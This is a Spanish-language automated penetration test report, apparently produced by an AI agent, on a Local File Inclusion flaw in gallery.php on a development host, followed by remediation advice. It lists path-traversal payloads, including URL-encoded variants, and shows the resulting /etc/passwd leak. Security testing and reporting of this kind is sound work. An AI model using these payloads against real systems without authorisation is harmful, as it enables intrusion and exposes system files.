# Informe de análisis LFI — 2026-04-18T19:05:00

Objetivo: http://web.dev.local:8081

Resumen ejecutivo
-----------------
- Vulnerabilidad encontrada: Sí (Local File Inclusion)
- Vulnerabilidad explotada: Sí — se obtuvo /etc/passwd

Detalle técnico
---------------
1) Reconocimiento
- Página objetivo: / (home) contiene enlaces a gallery.php?page=<categoria>.
- Parámetro vulnerable: page en gallery.php

2) Pruebas
- Se probaron múltiples payloads de path traversal y codificaciones:
  - ../../../../etc/passwd
  - ../../../../../etc/passwd
  - ../../../../../../etc/passwd
  - %2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
  - /etc/passwd
- Todas las variantes anteriores devolvieron contenido de /etc/passwd integrado en la página HTML de salida.

3) Evidencia
- Petición de ejemplo:
  GET /gallery.php?page=../../../../etc/passwd
- Respuesta (fragmento):
  root:x:0:0:root:/root:/bin/bash
  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
  www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin

Impacto
-------
- Divulgación de archivos locales sensibles (ej. /etc/passwd). Permite enumeración de usuarios y posible escalada si se combinan con otros fallos.
- En servidores con PHP configurado sin restricciones, podría permitir inclusión de archivos remotos o ejecución si se consigue inyectar código o leer archivos con secretos.

Recomendaciones
---------------
1) Validación y saneamiento de entradas:
   - Nunca incluir archivos directamente usando parámetros sin validación estricta.
   - Usar una lista blanca (whitelist) de vistas/plantillas permitidas (p.ej. "modern", "classic", "about").
2) Evitar usar variables directas en include/require. Mapear valores del parámetro a rutas seguras.
3) Configuración del servidor/PHP:
   - deshabilitar allow_url_include y allow_url_fopen si están habilitados.
   - Usar open_basedir para restringir rutas accesibles por PHP.
4) Registro y monitoreo de intentos de traversal.

Pasos posteriores sugeridos
--------------------------
- Revisar código de gallery.php y reemplazar la inclusión dinámica por un mapeo seguro.
- Revisar logs para detectar accesos anómalos.

Archivos generados
------------------
- /tmp/resp_gallery_page_.._.._.._.._.._.._.._.._etc_passwd.txt (copia de la respuesta con /etc/passwd)
- /tmp/lfi_gallery_results.txt (resumen de coincidencias)

Hecho por: informe automático (GPT-5 mini)
